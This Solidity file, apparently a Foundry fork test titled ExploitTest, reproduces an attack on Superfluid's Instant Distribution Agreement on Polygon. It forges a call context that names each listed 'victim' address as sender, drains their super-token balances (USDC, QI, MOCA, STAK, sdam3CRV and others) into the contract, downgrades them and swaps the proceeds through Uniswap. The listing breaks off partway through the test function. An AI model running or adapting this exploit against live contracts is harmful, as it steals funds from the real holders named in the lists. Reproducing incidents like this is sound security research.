// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// import "forge-std/Test.sol";
import "../HarvestFF/interfaces/IERC20.sol";
import "../HarvestFF/interfaces/IUniswapV2Router02.sol";
import "../HarvestFF/interfaces/IFlashLoanReceiver.sol";

interface ISuperfluid {
    function callAgreement(
        address agreementClass,
        bytes calldata callData,
        bytes calldata userData
    )
        external
        returns (bytes memory returnedData);
}

interface IInstantDistributionAgreementV1 {
    function createIndex(
        address token,
        uint32 indexId,
        bytes calldata ctx)
            external
            returns(bytes memory newCtx);

    function updateIndex(
        address token,
        uint32 indexId,
        uint128 indexValue,
        bytes calldata ctx)
            external
            returns(bytes memory newCtx);

    function updateSubscription(
        address token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx)
            external
            returns(bytes memory newCtx);

    function claim(
        address token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx)
        external
        returns(bytes memory newCtx);
}

interface ISuperToken is IERC20 {
    function downgrade(uint256 amount) external;
}

interface ISETHCustom is ISuperToken {
    // using native token
    function upgradeByETH() external payable;
    function upgradeByETHTo(address to) external payable;
    function downgradeToETH(uint wad) external;
}


library ContextDefinitions {
    // app level
    uint256 constant internal CALL_INFO_APP_LEVEL_MASK = 0xFF;

    // call type
    uint256 constant internal CALL_INFO_CALL_TYPE_SHIFT = 32;
    uint256 constant internal CALL_INFO_CALL_TYPE_MASK = 0xF << CALL_INFO_CALL_TYPE_SHIFT;
    uint8 constant internal CALL_INFO_CALL_TYPE_AGREEMENT = 1;
    uint8 constant internal CALL_INFO_CALL_TYPE_APP_ACTION = 2;
    uint8 constant internal CALL_INFO_CALL_TYPE_APP_CALLBACK = 3;

    function decodeCallInfo(uint256 callInfo)
        internal pure
        returns (uint8 appLevel, uint8 callType)
    {
        appLevel = uint8(callInfo & CALL_INFO_APP_LEVEL_MASK);
        callType = uint8((callInfo & CALL_INFO_CALL_TYPE_MASK) >> CALL_INFO_CALL_TYPE_SHIFT);
    }

    function encodeCallInfo(uint8 appLevel, uint8 callType)
        internal pure
        returns (uint256 callInfo)
    {
        return uint256(appLevel) | (uint256(callType) << CALL_INFO_CALL_TYPE_SHIFT);
    }
}


interface UniSwapV2 {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Pair {
    function swap(
    uint256 amount0Out,
    uint256 amount1Out,
    address to,
    bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
}

interface IUSDT {
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
    function transfer(address recipient, uint256 amount) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IWMATIC  {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
    function transfer(address recipient, uint256 amount) external;
}

// curve ?
// def remove_liquidity(amount: uint256, min_amounts: uint256[N_COINS]): nonpayable
// def remove_liquidity_one_coin(token_amount: uint256, i: uint256, min_amount: uint256): nonpayable
interface ICurveCryptoSwap {
    function remove_liquidity(uint256 amount, uint256[] calldata min_amounts) external;
    function remove_liquidity_one_coin(uint256 token_amount, int128 i, uint256 min_amount) external;
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint deadline;
        uint amountIn;
        uint amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint amountOut);

    struct ExactInputParams {
        bytes path;
        address recipient;
        uint deadline;
        uint amountIn;
        uint amountOutMinimum;
    }
    function exactInput(
        ExactInputParams calldata params
    ) external payable returns (uint amountOut);
}



// eth_rpc_url = "https://rpc.ankr.com/polygon"
// fork_block_number = 24684668
// contract ExploitTest is Test{
contract ExploitTest {
    event Eat(address indexed token, uint256 amount);

    ISuperfluid superfluid = ISuperfluid(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    IInstantDistributionAgreementV1 ida = IInstantDistributionAgreementV1(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
    ISuperToken superusdc = ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F);
    ISETHCustom supereth = ISETHCustom(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3);
    IERC20 usdc = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    IERC20 USDT = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
    IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
    IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 SUPERQIDAO = IERC20(0xe1cA10e6a10c0F72B74dF6b7339912BaBfB1f8B5);
    IERC20 SUPERMOCA = IERC20(0x1ADcA32B906883e474aEbcBA5708B41F3645f941);
    IERC20 SUPERSDAM3CRV = IERC20(0x8ef4F0C0753048a39B4Bc4eB3f545Fdae00618B7);

    IERC20 SUPERWETH = IERC20(0x27e1e4E6BC79D93032abef01025811B7E4727e85);

    IERC20 SUPERSTAKDAO = IERC20(0x12c294107772b10815307c05989DABD71C21670e);
    IERC20 STAKDAO = IERC20(0x361A5a4993493cE00f61C32d4EcCA5512b82CE90);
    
    IERC20 SUPERSTAK = IERC20(0xcAE73e9EeE8a01b8B7F94b59133e3821F21470AB);
    IERC20 STAK = IERC20(0xccBe9B810d6574701d324fD6DbE0A1b68f9d5bf7);

    IERC20 SDAM3CRV = IERC20(0x7d60F21072b585351dFd5E8b17109458D97ec120);
    IERC20 QIDAO = IERC20(0x580A84C73811E1839F75d86d75d88cCa0c241fF4);
    IERC20 MOCA = IERC20(0xcE899f26928a2B21c6a2Fddd393EF37c61dbA918);
    // IERC20 UCHILD = IERC20(0xC7688ecFDd75C70695E11e33Ea68F4a105F9716a);

    IERC20 YCURVE = IERC20(0xE7a24EF0C5e95Ffb0f6684b813A78F2a3AD7D171);
    IERC20 MAI = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);
    // ICurveCryptoSwap CURVESWAP = ICurveCryptoSwap(0x1d8b86e3D88cDb2d34688e87E72F388Cb541B7C8);
    
    

    IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(0x5757371414417b8C6CAad45bAeF941aBc7d3Ab32); // Uniswap V2 Factory 주소
    ISwapRouter constant uniswapV3router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    address private constant UNISWAP_ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;
    
    // IUniswapV2Pair private pair;
    // IUniswapV2Pair private pairQIDAO;
    // IUniswapV2Pair private pairMOCA;
    // // IUniswapV2Pair private pairSTAK;
    // IUniswapV2Pair private pairYCURVE;
    // IUniswapV2Pair private pairMAI;

    IUniswapV2Router02 public uniswapRouter;

    // address[] public superTargets = [
    //     0xCAa7349CEA390F89641fe306D93591f87595dc1F,
    //     0xa37478676A7A86a6Fb9e8D57D3e543EAc8140A95,
    //     0x5A9e792143bf2708b4765C144451dCa54f559a19,
    //     0x7fabAdBdF7C144C9E76Ab630c8F3073FFEB5176E,
    //     0xd0E2C1e70b02C2c60D07D09086eb07FcF4efF682,
    //     0xe70bf452487a9045eE85d1334e8F169d87bB6De7,
    //     0x1e1f1758c8d6687C9AD13beD8A9F058C5341a359,
    //     0xcf09c3560b7176BFFE3700d1A1283fB85eaF85f9,
    //     0x582f19A6934a1D5b04592B4b5418022Ba1d78941,
    //     0xd3DDB4aA7Af5D73a1c019bedFcC179006D6C7329,
    //     0x40bB18F181938ACFbb62BAc84CC2812376FE817d,
    //     0x14008f25DE5A57C9a6C5c64d8275E99b8001138b,
    //     0x87c579Fc7c5fC68d36820Dc1EA715d8F9050E27F,
    //     0xc330FFE1c50b758B2d8ed09a37eca8313Bf53c81,
    //     0x3D7d429A7962d5d082A10558592bb7d29eB9211B,
    //     0x6d2C2d195bB3A6590b281f5191b299a2c423289A,
    //     0x742cFe2a1fb49AE444C91b696C771A7b2F65E9f4,
    //     0xD1C4ac338cA75985411724D2C353aaD1052E26fC,
    //     0x3f95A7E449Cc4790B895909fb64c2729f8791eeD,
    //     0xcCfbaE9378a330C6c66d01412f502E46849C29CF,
    //     0x9416a42bF7C5dF461145daEd1d9773c3E144cDb3,
    //     0x0E4c1A58051CbEC81Bf073DEbC48950CE9E65A62,
    //     0x4f3B3399724a461BE02037844C6Df39Fcd8d8faA,
    //     0x532Ae4624f4bF8b04A1562cf9EEd104cC7113ef5,
    //     0xddFc6AF85c01De36690f1679c7671bBe19e7b0e0,
    //     0x573450522Edfdc89B380Fa250EDEdff08c817Fd5,
    //     0x21E2441035Cdd3FDDa3b2CEc0CCd3c11CDAE4725,
    //     0x6daF6dc3c8AA3Ee860478645205B5F9D6397616D,
    //     0x8A65eeC7F9F55cEA0D2b5C9386A582d744FBF5c1,
    //     0x0023d9ffe7D793895c5dA5833d56c737832Ead2b,
    //     0xd43cf371b04445164cdCBbB5D1AE15414626cE55,
    //     0x8D6B635290EC9F8Bb32F90F9542Bab830847f664,
    //     0x9176b3Fb8111887F3E654afc8B009FCA75501E26,
    //     0x9AE1562644EEcFE8Ce8C631d37c160C54e2B8D57,
    //     0x130867AFc04071eCD2475cB6727A6a924205C1Fd,
    //     0xC6E2bacD63a3a53AD503052ec836706bA3144B9b,
    //     0x9ed0284D5f8C981AaD7e801Cb0CD58780c3c8E18,
    //     0xBB97163Dd58C788c2C8F37dba929Cef6cc5faD59,
    //     0xDfAEc1Cf903a57F99A49df398E7Dd5036ec95C67,
    //     0x541c746362DCe987e6F87D8653cc9cAcFb1712b1,
    //     0x8dA8a71B40429F558569Daf38dF600885c04EBbb,
    //     0x64c7A39B5db79d2133c433001a1A36AE6aBBd2f0,
    //     0x4D8565941878cD78fA3fC24DA61B920bDa5d256d,
    //     0x9Ac0AD4CE9178B841077fD25eDEb4630d3924F2a
    // ];
        

    // address[] public victims = [
    //     0x5073c1535A1a238E7c7438c553F1a2BaAC366cEE,
    //     0xe6116AA08e14afE08A9A563E9ef6cCd5b47070B7,
    //     0x0154d25120Ed20A516fE43991702e7463c5A6F6e,
    //     0x6583f33895B538DFdeeE234F2D34dF1033655de1,
    //     0xe44257ec3c1767074f9d0A648073Eb1e6D369f8a,
    //     0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188,
    //     0x81Ea02098336435d5e92e032C029AAB850304f5D,
    //     0xA08f80dc1759b12fdC40A4dc64562b322C418E1f,
    //     0xD6Fb1f82FF2296b55bddfFcCe80ABde7fbC6c22d,
    //     0x39b7B5fb06C4B24D8758306774D7340dC694320A,
    //     0x8393183E7217D982A698682a3F620ae6957f6F2d,
    //     0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7,
    //     0x1EB3FAA360bF1f093F5A18d21f21f13D769d044A,
    //     0x2Af4AE1226f28A1a3bc239b96e16291EF4fDD57d,
    //     0xAF8b668bfC2aD9457c03c2989C7816b5cbe2185c,
    //     0x0C3483e3B355986D6Bb76E3CEbBC8dD8EC20779C,
    //     0xf7f0CFC3772d29d4CC1482A2ACB7Be16a85a2223,
    //     0x87a4b3E26D17C88C8E22B605bb211f3b92c659F4,
    //     0x290a27026021af22b1794Dc1e489A35869820637,
    //     0xdf924446d08C642E0B1Df15089E2ab87f737a544,
    //     0x7749e869B88A3C45b40F8C257E0bB36981b8262f,
    //     0xc78131beAdF917DFa2aCE8fAf49eA88Ada7c4bD0
    // ];
    // superUSDc
    address[] public victims_usdc = [
        0x6583f33895B538DFdeeE234F2D34dF1033655de1,
        0xe44257ec3c1767074f9d0A648073Eb1e6D369f8a,
        0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188,
        0x81Ea02098336435d5e92e032C029AAB850304f5D,
        0xA08f80dc1759b12fdC40A4dc64562b322C418E1f,
        0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7,
        0x1EB3FAA360bF1f093F5A18d21f21f13D769d044A,
        0x2Af4AE1226f28A1a3bc239b96e16291EF4fDD57d,
        0xAF8b668bfC2aD9457c03c2989C7816b5cbe2185c,
        0x0C3483e3B355986D6Bb76E3CEbBC8dD8EC20779C,
        0xf7f0CFC3772d29d4CC1482A2ACB7Be16a85a2223,
        0x87a4b3E26D17C88C8E22B605bb211f3b92c659F4,
        0x290a27026021af22b1794Dc1e489A35869820637,
        0xdf924446d08C642E0B1Df15089E2ab87f737a544,
        0xeF4508D8A6dEBA4B67d701d883619ECED614D1c6, // delta
        0x7fabAdBdF7C144C9E76Ab630c8F3073FFEB5176E,
        0xd0E2C1e70b02C2c60D07D09086eb07FcF4efF682,
        0xe70bf452487a9045eE85d1334e8F169d87bB6De7,
        0x4D8565941878cD78fA3fC24DA61B920bDa5d256d
        // 0x1e1f1758c8d6687C9AD13beD8A9F058C5341a359
    ];

    address[] public victims_eth = [
        0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7,
        0x1EB3FAA360bF1f093F5A18d21f21f13D769d044A
        // 0xB3Be322AC4dF14E9c16D3A13419d6A119415b042,
        // 0x1CF8965202Bc3c59e3Fa402b077e1790EADE0753,
        // 0xCAa7349CEA390F89641fe306D93591f87595dc1F,
        // 0x5A9e792143bf2708b4765C144451dCa54f559a19,
        // 0x582f19A6934a1D5b04592B4b5418022Ba1d78941,
        // 0x40bB18F181938ACFbb62BAc84CC2812376FE817d,
        // 0x14008f25DE5A57C9a6C5c64d8275E99b8001138b,
        // 0x87c579Fc7c5fC68d36820Dc1EA715d8F9050E27F,
        // 0xc330FFE1c50b758B2d8ed09a37eca8313Bf53c81,
        // 0x6d2C2d195bB3A6590b281f5191b299a2c423289A,
        // 0x742cFe2a1fb49AE444C91b696C771A7b2F65E9f4,
        // 0xD1C4ac338cA75985411724D2C353aaD1052E26fC,
        // 0x3f95A7E449Cc4790B895909fb64c2729f8791eeD,
        // 0xcCfbaE9378a330C6c66d01412f502E46849C29CF,
        // 0x9416a42bF7C5dF461145daEd1d9773c3E144cDb3,
        // 0x0E4c1A58051CbEC81Bf073DEbC48950CE9E65A62,
        // 0x4f3B3399724a461BE02037844C6Df39Fcd8d8faA,
        // 0x532Ae4624f4bF8b04A1562cf9EEd104cC7113ef5,
        // 0xddFc6AF85c01De36690f1679c7671bBe19e7b0e0,
        // 0x21E2441035Cdd3FDDa3b2CEc0CCd3c11CDAE4725
    ];


    address[] public victims_sdam3CRV = [
        0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7,
        0x1EB3FAA360bF1f093F5A18d21f21f13D769d044A,
        0x7749e869B88A3C45b40F8C257E0bB36981b8262f,
        0xD6Fb1f82FF2296b55bddfFcCe80ABde7fbC6c22d,
        0xc78131beAdF917DFa2aCE8fAf49eA88Ada7c4bD0
    ];

    address[] public victims_stak = [
        0x8393183E7217D982A698682a3F620ae6957f6F2d,
        0xAF8b668bfC2aD9457c03c2989C7816b5cbe2185c
    ];

    address[] public victims_qi = [
        0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7,
        0x5073c1535A1a238E7c7438c553F1a2BaAC366cEE,
        0xe6116AA08e14afE08A9A563E9ef6cCd5b47070B7,
        0x1EB3FAA360bF1f093F5A18d21f21f13D769d044A
    ];

    address[] public victims_mooca = [
        0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7,
        0x39b7B5fb06C4B24D8758306774D7340dC694320A
    ];

    address[] public victims_stakedao = [
        0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7,
        0xD6Fb1f82FF2296b55bddfFcCe80ABde7fbC6c22d,
        0x1EB3FAA360bF1f093F5A18d21f21f13D769d044A
    ];

    address[] public victims_superweth  = [
        0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7,
        0x1EB3FAA360bF1f093F5A18d21f21f13D769d044A,
        0x0154d25120Ed20A516fE43991702e7463c5A6F6e //delta
        // 0x14008f25DE5A57C9a6C5c64d8275E99b8001138b,
        // 0xddFc6AF85c01De36690f1679c7671bBe19e7b0e0,
        // 0xf3dAEC775fB48924DD162e87c5cb22Cd6153182a,
        // 0x6daF6dc3c8AA3Ee860478645205B5F9D6397616D,
        // 0x3fe69e61d697dcf399dEf32C97EaFd7470Fa8eec,
        // 0x085645b011B36ADbEf1255b3B3F94b456Db262f8,
        // 0x19f69bAb614b7007fbF671aC5D3715Ab566f6712,
        // 0xBf578eF30f827282b37Fe5C42145D8B7018D32bb
    ];

    function swapExactInputSingleHop(
        address tokenIn,
        address tokenOut,
        uint24 poolFee,
        uint amountIn
    ) public returns (uint amountOut) {
        // IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
        IERC20(tokenIn).approve(address(uniswapV3router), amountIn);
        IERC20(tokenIn).approve(address(this), amountIn);


        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: tokenIn,
                tokenOut: tokenOut,
                fee: poolFee,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amountIn,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        amountOut = uniswapV3router.exactInputSingle(params);
    }
    function uniswapSwapV3ToWETH(uint256 _amountIn, IERC20 _tokens) internal {
        // _tokens.approve(address(uniswapV3router), _amountIn);
        // _tokens.approve(address(this), _amountIn);
    
        address[] memory path = new address[](2);
        path[0] = address(_tokens);
        path[1] = address(WMATIC);
        
        uint amountOut = swapExactInputSingleHop(path[0],path[1], 3000, _amountIn);

        // IUniswapV2Router(address(0x9A0CC6791a5409ce3547F1f1d00e058c79D0A72c)).swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    }

    function uniswapSwapMaster(uint256 _amount, IERC20 _token) public {
        _token.approve(address(uniswapRouter), _amount);
        _token.approve(address(this), _amount);

        address[] memory path = new address[](2);
        path[0] = address(_token);
        path[1] = address(WMATIC);
        uniswapRouter.swapExactTokensForTokens(_amount, 0, path, address(this), block.timestamp);
    }

    // function uniswapSwap(uint256 _amountIn) public {
    //     // Approve transfer of USDC token to uniswapRouter
    //     usdc.approve(address(uniswapRouter), _amountIn);
    //     usdc.approve(address(this), _amountIn);

    //     // Get current reserves of the USDC-WMATIC
    //     // (uint256 reserveUSDC, uint256 reserveWETH, ) = pair.getReserves();

    //     // Calculate the amount of WETH to receive
    //     // uint256 amountOut = uniswapRouter.getAmountOut(_amountIn, reserveUSDC, reserveWETH);

    //     // Swap USDC for WETH
    //     address[] memory path = new address[](2);
    //     path[0] = address(usdc);
    //     path[1] = address(WMATIC);
    //     uniswapRouter.swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    // }

    // function uniswapSwapQIDAO(uint256 _amountIn) public {
    //     // Approve transfer of USDC token to uniswapRouter
    //     QIDAO.approve(address(uniswapRouter), _amountIn);
    //     QIDAO.approve(address(this), _amountIn);

    //     // Get current reserves of the USDC-WMATIC
    //     // (uint256 reserveUSDC, uint256 reserveWETH, ) = pairQIDAO.getReserves();

    //     // Calculate the amount of WETH to receive
    //     // uint256 amountOut = uniswapRouter.getAmountOut(_amountIn, reserveUSDC, reserveWETH);
        

    //     // Swap USDC for WETH
    //     address[] memory path = new address[](2);
    //     path[0] = address(QIDAO);
    //     path[1] = address(WMATIC);
    //     uniswapRouter.swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    // }

    // function uniswapSwapMOCA(uint256 _amountIn) public {
    //     // Approve transfer of USDC token to uniswapRouter
    //     MOCA.approve(address(uniswapRouter), _amountIn);
    //     MOCA.approve(address(this), _amountIn);

    //     // Get current reserves of the USDC-WMATIC
    //     // (uint256 reserveUSDC, uint256 reserveWETH, ) = pairMOCA.getReserves();

    //     // Calculate the amount of WETH to receive
    //     // uint256 amountOut = uniswapRouter.getAmountOut(_amountIn, reserveUSDC, reserveWETH);
        

    //     // Swap USDC for WETH
    //     address[] memory path = new address[](2);
    //     path[0] = address(MOCA);
    //     path[1] = address(WMATIC);
    //     uniswapRouter.swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    // }

    function uniswapSwapYCURVE(uint256 _amountIn) public {
        // Approve transfer of USDC token to uniswapRouter
        YCURVE.approve(address(uniswapRouter), _amountIn);
        YCURVE.approve(address(this), _amountIn);

        // Get current reserves of the USDC-WMATIC
        // (uint256 reserveUSDC, uint256 reserveWETH, ) = pairYCURVE.getReserves();

        // Calculate the amount of WETH to receive
        // uint256 amountOut = uniswapRouter.getAmountOut(_amountIn, reserveUSDC, reserveWETH);
        

        // Swap USDC for WETH
        address[] memory path = new address[](2);
        path[0] = address(YCURVE);
        path[1] = address(MAI);
        uniswapRouter.swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    }

    function uniswapSwapMAI(uint256 _amountIn) public {
        // Approve transfer of USDC token to uniswapRouter
        MAI.approve(address(uniswapRouter), _amountIn);
        MAI.approve(address(this), _amountIn);

        // Get current reserves of the USDC-WMATIC
        // (uint256 reserveUSDC, uint256 reserveWETH, ) = pairYCURVE.getReserves();

        // Calculate the amount of WETH to receive
        // uint256 amountOut = uniswapRouter.getAmountOut(_amountIn, reserveUSDC, reserveWETH);
        

        // Swap USDC for WETH
        address[] memory path = new address[](2);
        path[0] = address(MAI);
        path[1] = address(WMATIC);
        uniswapRouter.swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    }


    function uniswapSwapSTAKWETH(uint256 _amountIn) public {
        // Approve transfer of USDC token to uniswapRouter
        STAK.approve(address(uniswapRouter), _amountIn);
        STAK.approve(address(this), _amountIn);

        // Get current reserves of the USDC-WMATIC
        // (uint256 reserveUSDC, uint256 reserveWETH, ) = pairSTAK.getReserves();

        // Swap USDC for WETH
        address[] memory path = new address[](2);
        path[0] = address(STAK);
        path[1] = address(WETH);
        uniswapRouter.swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    }

    // function uniswapSwapWETHMATIC(uint256 _amountIn) public {
    //     // Approve transfer of USDC token to uniswapRouter
    //     WETH.approve(address(uniswapRouter), _amountIn);
    //     WETH.approve(address(this), _amountIn);

    //     // Get current reserves of the USDC-WMATIC
    //     // (uint256 reserveUSDC, uint256 reserveWETH, ) = pairWETH.getReserves();

    //     // Swap USDC for WETH
    //     address[] memory path = new address[](2);
    //     path[0] = address(WETH);
    //     path[1] = address(WMATIC);
    //     uniswapRouter.swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    // }


    constructor() {
        uniswapRouter = IUniswapV2Router02(UNISWAP_ROUTER);
    }

    struct Context {
        // callback level
        uint8 appLevel;
        // type of call
        uint8 callType;
        // the system timestsamp
        uint256 timestamp;
        // The intended message sender for the call
        address msgSender;

        // For callbacks it is used to know which agreement function selector is called
        bytes4 agreementSelector;
        // User provided data for app callbacks
        bytes userData;

        // app allowance granted
        uint256 appAllowanceGranted;
        // app allowance wanted by the app callback
        uint256 appAllowanceWanted;
        // app allowance used, allowing negative values over a callback session
        int256 appAllowanceUsed;
        // app address
        address appAddress;
        // app allowance in super token
        address appAllowanceToken;
    }

    function encodeContext(Context memory context)
        private pure
        returns (bytes memory ctx)
    {
        uint256 callInfo = ContextDefinitions.encodeCallInfo(context.appLevel, context.callType);
        uint256 allowanceIO =
            uint128(context.appAllowanceGranted) |
            (uint256(uint128(context.appAllowanceWanted)) << 128);
        ctx = abi.encode(
            abi.encode(
                callInfo,
                context.timestamp,
                context.msgSender,
                context.agreementSelector,
                context.userData
            ),
            abi.encode(
                allowanceIO,
                context.appAllowanceUsed,
                context.appAddress,
                context.appAllowanceToken
            )
        );

    }

    // function platformBalancCheck(address[] memory targets) public {
    //     for (uint256 i = 0; i < targets.length; i++) {
    //         address victim = targets[i];

    //         uint256 _superusdc = superusdc.balanceOf(victim);
            // uint256 _supereth = supereth.balanceOf(victim);
            // uint256 _superqidao = SUPERQIDAO.balanceOf(victim);
            // uint256 _supermoca = SUPERMOCA.balanceOf(victim);
            // uint256 _supersdam3crv = SUPERSDAM3CRV.balanceOf(victim);
            // uint256 _superweth = SUPERWETH.balanceOf(victim);
            // uint256 _superstakdao = SUPERSTAKDAO.balanceOf(victim);
            // uint256 _superstak = SUPERSTAK.balanceOf(victim);

            // if (_superusdc > 0) {
            //     // emit superusdc(victim, superusdc);
            //     emit log_address(victim);
            //     emit log_named_uint("[SUPERUSDC]", _superusdc);
    
            // }
            // if (_supereth > 0) {
            //     // emit supereth(victim, supereth);
            //     emit log_address(victim);
            //     emit log_named_uint("[SUPERETH]", _supereth);
            // }
            // if (_superqidao > 0) {
            //     // emit superqidao(victim, SUPERQIDAO);
            //     emit log_address(victim);
            //     emit log_named_uint("[SUPERQIDAO]", _superqidao);
            // }
            // if (_supermoca > 0) {
            //     // emit supermoca(victim, SUPERMOCA);
            //     emit log_address(victim);
            //     emit log_named_uint("[SUPERMOCA]", _supermoca);
            // }
            // if (_supersdam3crv > 0) {
            //     // emit supersdam3crv(victim, SUPERSDAM3CRV);
            //     emit log_address(victim);
            //     emit log_named_uint("[SUPERSDAM]", _supersdam3crv);
            // }
            // if (_superweth > 0) {
            //     // emit superweth(victim, SUPERWETH);
            //     emit log_address(victim);
            //     emit log_named_uint("[SUPERWETH]", _superweth);
            // }
            // if (_superstakdao > 0) {
            //     // emit superstakdao(victim, SUPERSTAKDAO);
            //     emit log_address(victim);
            //     emit log_named_uint("[SUPERSTAKDAO]", _superstakdao);
            // }
            // if (_superstak > 0) {
            //     // emit superstak(victim, SUPERSTAK);
            //     emit log_address(victim);
            //     emit log_named_uint("[SUPERSTAK]", _superstak);
            // }

        // }
    // }

    function attack(address[] memory targets, uint8 branch, address token) public {
        for (uint256 i = 0; i < targets.length; i++) {
            address victim = targets[i];
            
            Context memory ctx = Context({
                appLevel: 0,
                callType: ContextDefinitions.CALL_INFO_CALL_TYPE_AGREEMENT,
                timestamp: block.timestamp,
                msgSender: victim,
                agreementSelector: 0,
                userData: "",
                appAllowanceGranted: 0,
                appAllowanceWanted: 0,
                appAllowanceUsed: 0,
                appAddress: address(0),
                appAllowanceToken: address(0)
            });

            uint32 indexId = 0xdeadbeaf + uint32(i);

            // crateIndex(superusdc, indexId, fakeCTx)
            superfluid.callAgreement(
                address(ida),
                abi.encodeWithSelector(
                    IInstantDistributionAgreementV1.createIndex.selector,
                    (token),
                    indexId,
                    encodeContext(ctx),
                    new bytes(0)
                ),
                new bytes(0)
            );

            uint256 units = IERC20(token).balanceOf(victim);
            

            // updateSubscription(ISuperToken(token), indexId, victim, units, fakeCtx)
            superfluid.callAgreement(
                address(ida),
                abi.encodeWithSelector(
                    IInstantDistributionAgreementV1.updateSubscription.selector,
                    (token),
                    indexId,
                    address(this),
                    units,
                    encodeContext(ctx),
                    new bytes(0)
                ),
                new bytes(0)
            );

            
            superfluid.callAgreement(
                address(ida),
                abi.encodeWithSelector(
                    IInstantDistributionAgreementV1.updateIndex.selector,
                    (token),
                    indexId,
                    1,
                    encodeContext(ctx),
                    new bytes(0)
                ),
                new bytes(0)
            );

            superfluid.callAgreement(
                address(ida),
                abi.encodeWithSelector(
                    IInstantDistributionAgreementV1.claim.selector,
                    (token),
                    victim,
                    indexId,
                    address(this),
                    new bytes(0)
                ),
                new bytes(0)
            );
            if (branch == 1) {
                uint _supereth = supereth.balanceOf(address(this));
                supereth.downgradeToETH(_supereth);    
            } else {
                uint _superusdc = IERC20(token).balanceOf(address(this));   
                ISuperToken(token).downgrade(_superusdc);
            }
        }

    }
    function testExploit() public {
        // payable(address(0)).transfer(address(this).balance);
        // uint256 _base = 79228162514264337593543950335;
        // platformBalancCheck(superTargets);
        attack(victims_sdam3CRV, 0, address(SUPERSDAM3CRV));

        uint256 _sdam3crvShare = IWMATIC(address(SDAM3CRV)).balanceOf(address(this));
        IWMATIC(address(SDAM3CRV)).withdraw(_sdam3crvShare);
        uint256 _yCurveBalance = YCURVE.balanceOf(address(this));
        uniswapSwapYCURVE(_yCurveBalance);
        uint256 _maiBalance = MAI.balanceOf(address(this));
        uniswapSwapMaster(_maiBalance, MAI);


        attack(victims_qi, 0, address(SUPERQIDAO));
        attack(victims_mooca, 0, address(SUPERMOCA));
        attack(victims_stak, 0, address(SUPERSTAK));
        attack(victims_stakedao, 0, address(SUPERSTAKDAO));
        attack(victims_usdc, 0, address(superusdc));
        uint256 _stakBalance = STAK.balanceOf(address(this));
        uniswapSwapSTAKWETH(_stakBalance);
        
        // // usdc => WETH
        uint256 _usdcBalance = usdc.balanceOf(address(this));
        uint256 _qidaoBalance = QIDAO.balanceOf(address(this));
        uint256 _mocaBalance = MOCA.balanceOf(address(this));
        uint256 _stakdaoBalance = STAKDAO.balanceOf(address(this));
        uniswapSwapMaster(_stakdaoBalance, STAKDAO);
        uniswapSwapMaster(_qidaoBalance, QIDAO);
        uniswapSwapMaster(_mocaBalance, MOCA);
        uniswapSwapMaster(_usdcBalance, usdc);

